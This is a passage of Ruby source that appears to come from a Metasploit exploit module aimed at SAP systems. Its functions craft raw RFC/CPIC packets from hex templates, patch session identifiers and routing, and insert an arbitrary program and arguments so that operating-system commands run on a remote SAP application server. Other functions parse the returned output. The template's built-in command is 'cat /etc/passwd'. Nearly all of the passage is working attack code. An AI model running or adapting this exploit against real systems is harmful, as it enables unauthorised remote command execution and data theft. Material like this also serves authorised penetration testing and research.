  def build_p3_noargs(conv_id, program, pte, sid, appserver)
    # Decode template and patch byte5/byte77 consistency
    pkt = [P3_TEMPLATE_NOARGS].pack('H*').dup.force_encoding('BINARY')

    # Conv_id
    cid = conv_id[0, 8].ljust(8, "\x00")
    pkt[40, 8] = cid

    # Patch session PTEs
    new_th_pte = compute_th_pte(pte)
    pkt = pkt.gsub(NOARGS_MAIN_PTE, pte)
    pkt = pkt.gsub(noargs_th_pte, new_th_pte)
    pkt = pkt.gsub(noargs_pte_ip_suffix, pte_ip_suffix(pte))

    # Replace command data (TABLE_LINE marker + 13 bytes offset)
    tl_idx = pkt.index('TABLE_LINE')
    if tl_idx
      cmd_data_off = tl_idx + 13
      new_cmd = program.b.ljust(6, ' ')
      pkt[cmd_data_off, 6] = new_cmd[0, 6]
    end

    # Patch routing
    pkt = patch_p3_routing(pkt, sid, appserver)

    pkt
  end

  def build_p3_args(conv_id, program, args, pte, sid, appserver)
    # Template constants
    tmpl_cmd_len = 3      # "cat"
    tmpl_args_len = 11    # "/etc/passwd"
    cmd_data_off = 1451
    args_data_off = 1496

    # Decode template. Also patch byte5 and byte77 to match NOARGS/P2/P4 consistency
    pkt = [P3_TEMPLATE_ARGS].pack('H*').dup.force_encoding('BINARY')
    noargs_raw = [P3_TEMPLATE_NOARGS].pack('H*')
    pkt[5] = noargs_raw[5]    # 0x3c -> 0x2c
    pkt[77] = noargs_raw[77]  # 0x03 -> 0x05

    # Conv_id
    cid = conv_id[0, 8].ljust(8, "\x00")
    pkt[40, 8] = cid

    # Patch session PTEs
    new_th_pte = compute_th_pte(pte)
    pkt = pkt.gsub(ARGS_MAIN_PTE, pte)
    pkt = pkt.gsub(args_th_pte, new_th_pte)
    old_ip_suffix = "\xe1\x00\x00\x00" + ARGS_MAIN_PTE[12..15]
    pkt = pkt.gsub(old_ip_suffix, pte_ip_suffix(pte))

    new_cmd = program.b
    new_args = args.b
    new_cmd_len = new_cmd.length
    new_args_len = new_args.length

    cmd_delta = new_cmd_len - tmpl_cmd_len
    args_delta = new_args_len - tmpl_args_len
    total_delta = cmd_delta + args_delta

    pkt = pkt.dup.force_encoding('BINARY')

    # Adjust counters
    if total_delta != 0
      # CPIC header size (4-byte BE)
      old_cpic = pkt[48, 4].unpack1('N')
      pkt[48, 4] = [old_cpic + total_delta].pack('N')

      # Serialization header size (2-byte BE)
      old_ser = pkt[1267, 2].unpack1('n')
      pkt[1267, 2] = [old_ser + total_delta].pack('n')

      # Serialization sub-size bytes
      pkt[1284] = [(pkt.getbyte(1284) + total_delta) & 0xFF].pack('C')
      pkt[1288] = [(pkt.getbyte(1288) + total_delta) & 0xFF].pack('C')
    end

    if cmd_delta != 0
      # f8 block size
      pkt[1414] = [(pkt.getbyte(1414) + cmd_delta) & 0xFF].pack('C')

      # Q markers
      adjust_q_marker(pkt, 1454, cmd_delta)
      adjust_q_marker(pkt, 1480, cmd_delta)

      # Byte counters
      [1462, 1476, 1484, 1491].each do |off|
        pkt[off] = [(pkt.getbyte(off) + cmd_delta) & 0xFF].pack('C')
      end
    end

    if args_delta != 0
      # Bytes [1492:1493] form a 2-byte BE size field.  The args_delta*16
      # adjustment can overflow a single byte when args grow by 2+ bytes
      # (base value 0xe7=231, only 1 unit of headroom in the low byte).
      # Propagate carry to the high byte at 1492.
      old_val = (pkt.getbyte(1492) << 8) | pkt.getbyte(1493)
      new_val = old_val + args_delta * 16
      pkt[1492] = [(new_val >> 8) & 0xFF].pack('C')
      pkt[1493] = [new_val & 0xFF].pack('C')
      [1515, 1541].each do |off|
        pkt[off] = [(pkt.getbyte(off) + args_delta) & 0xFF].pack('C')
      end
    end

    if total_delta != 0
      adjust_q_marker(pkt, 1507, total_delta)
      adjust_q_marker(pkt, 1547, total_delta)
      adjust_q_marker(pkt, 1593, total_delta)

      [1551, 1565, 1572, 1582].each do |off|
        pkt[off] = [(pkt.getbyte(off) + total_delta) & 0xFF].pack('C')
      end
    end

    # Command and args length bytes
    pkt[1449] = [new_cmd_len].pack('C')
    pkt[1494] = [new_args_len].pack('C')

    # Replace command data
    pkt = pkt[0...cmd_data_off] + new_cmd + pkt[(cmd_data_off + tmpl_cmd_len)..]

    # Replace args data (shifted by cmd_delta)
    new_args_off = args_data_off + cmd_delta
    pkt = pkt[0...new_args_off] + new_args + pkt[(new_args_off + tmpl_args_len)..]

    # CPIC trailer size
    orig_template = [P3_TEMPLATE_ARGS].pack('H*')
    old_cpic_orig = orig_template[48, 4].unpack1('N')
    pkt[-8, 4] = [old_cpic_orig + total_delta].pack('N')

    # Patch routing
    pkt = patch_p3_routing(pkt, sid, appserver)

    pkt
  end

  def build_sap_send_start_npl(conv_id, cmd_str, pte, sid, appserver, client_ip, target_ip)
    parts = cmd_str.split(' ', 2)
    program = parts[0]
    args = parts[1] || ''

    pkt = [P3_NPL_TEMPLATE].pack('H*').dup.force_encoding('BINARY')

    # Conv_id
    cid = conv_id[0, 8].ljust(8, "\x00")
    pkt[40, 8] = cid

    # Patch session PTEs
    new_th_pte = compute_th_pte(pte)
    pkt = pkt.gsub(NPL_MAIN_PTE, pte)
    pkt = pkt.gsub(npl_th_pte, new_th_pte)
    pkt = pkt.gsub(npl_pte_ip_suffix, pte_ip_suffix(pte))

    # Patch routing first (may change packet size)
    len_before = pkt.length
    pkt = patch_p3_routing_npl(pkt, sid, appserver)
    pkt = patch_conn_info_npl(pkt, client_ip, target_ip)
    offset_delta = pkt.length - len_before

    extprog_off = NPL_EXTPROG_OFF + offset_delta
    params_off = NPL_PARAMS_OFF + offset_delta

    # Write EXTPROG: program name as CHAR(128) UTF-16 LE, zero-padded to 256 bytes
    prog_u16 = program.encode('UTF-16LE').b
    extprog = (prog_u16 + "\x00" * [0, 256 - prog_u16.length].max)[0, 256]
    pkt[extprog_off, 256] = extprog

    # Write PARAMS: arguments as CHAR(255) UTF-16 LE, space-padded to 510 bytes
    args_u16 = args.encode('UTF-16LE').b
    n_space_pad = [0, (510 - args_u16.length) / 2].max
    params = (args_u16 + ("\x20\x00" * n_space_pad))[0, 510].ljust(510, "\x00")
    pkt[params_off, 510] = params

    pkt
  end

  def build_sap_send_end(conv_id, pte)
    pkt = [P4_TEMPLATE].pack('H*').dup.force_encoding('BINARY')
    cid = conv_id[0, 8].ljust(8, "\x00")
    pkt[40, 8] = cid

    new_th_pte = compute_th_pte(pte)
    pkt = pkt.gsub(NOARGS_MAIN_PTE, pte)
    pkt = pkt.gsub(noargs_th_pte, new_th_pte)
    pkt = pkt.gsub(noargs_pte_ip_suffix, pte_ip_suffix(pte))
    pkt
  end

  def build_sap_send_end_npl(conv_id, pte)
    pkt = [P4_NPL_TEMPLATE].pack('H*').dup.force_encoding('BINARY')
    cid = conv_id[0, 8].ljust(8, "\x00")
    pkt[40, 8] = cid

    new_th_pte = compute_th_pte(pte)
    pkt = pkt.gsub(NPL_MAIN_PTE, pte)
    pkt = pkt.gsub(npl_th_pte, new_th_pte)
    pkt = pkt.gsub(npl_pte_ip_suffix, pte_ip_suffix(pte))
    pkt
  end

  # ========================================================================
  # Response parsing
  # ========================================================================

  def extract_p2_info(response)
    fail_with(Failure::UnexpectedReply, "INIT response too short (#{response.length} bytes)") if response.length < 121

    conv_id = response[40, 8].delete("\x00")
    fail_with(Failure::UnexpectedReply, 'Empty conv_id in INIT response') if conv_id.strip.empty?

    pte = response[105, 16]
    [conv_id, pte]
  end

  def decode_rows(data, num_rows, row_size = 256)
    lines = []
    num_rows.times do |i|
      chunk = data[i * row_size, row_size]
      break if chunk.nil? || chunk.length < row_size
      begin
        line = chunk.force_encoding('UTF-16LE').encode('UTF-8').rstrip
      rescue Encoding::InvalidByteSequenceError, Encoding::UndefinedConversionError
        line = chunk.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).rstrip
      end
      lines << line
    end
    lines.join("\n")
  end

  def extract_output(response)
    # Uncompressed format: 03 02 03 03
    marker = "\x03\x02\x03\x03"
    idx = response.index(marker)
    if idx
      num_lines = if idx >= 4
                    response[idx - 4, 4].unpack1('N')
                  else
                    1
                  end

      return '' if num_lines == 0

      pos = idx + 4
      lines = []
      num_lines.times do |i|
        if i > 0 && pos + 4 <= response.length && response[pos, 4] == INTER_ROW_SEP
          pos += 4
        end
        break if pos + 258 > response.length

        pos += 2 # skip 2-byte row header
        utf16_data = response[pos, 256]
        begin
          line = utf16_data.force_encoding('UTF-16LE').encode('UTF-8').rstrip
        rescue Encoding::InvalidByteSequenceError, Encoding::UndefinedConversionError
          line = utf16_data.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).rstrip
        end
        lines << line
        pos += 256
      end
      return lines.join("\n")
    end

    # Compressed format: 03 02 03 05 (requires pysapcompress - not supported in MSF)
    comp_marker = "\x03\x02\x03\x05"
    if response.index(comp_marker)
      print_warning('Output appears to be SAP LZH compressed. Large outputs may not be decoded.')
      return nil
    end

    nil
  end

  def check_response_error(response)
    return 'Response too short' if response.length < 10
    return "Unexpected response version: 0x#{response.getbyte(0).to_s(16)}" if response.getbyte(0) != 0x06

    ['*ERR*', '***ERROR', 'ERR_MSG', 'EXCEPTION'].each do |em|
      eidx = response.index(em)
      next unless eidx

      ctx_start = [0, eidx - 20].max
      context = response[ctx_start, 100] || response[ctx_start..]
      # Check if UTF-16 LE encoded
      odd_bytes = (1...context.length).step(2).map { |i| context.getbyte(i) }
      if odd_bytes.length > 0 && odd_bytes.count(0) > odd_bytes.length / 2
        return context.force_encoding('UTF-16LE').encode('UTF-8', invalid: :replace, undef: :replace).strip
      end

      return context.force_encoding('ASCII').encode('UTF-8', invalid: :replace, undef: :replace).strip
    end

    nil
  end

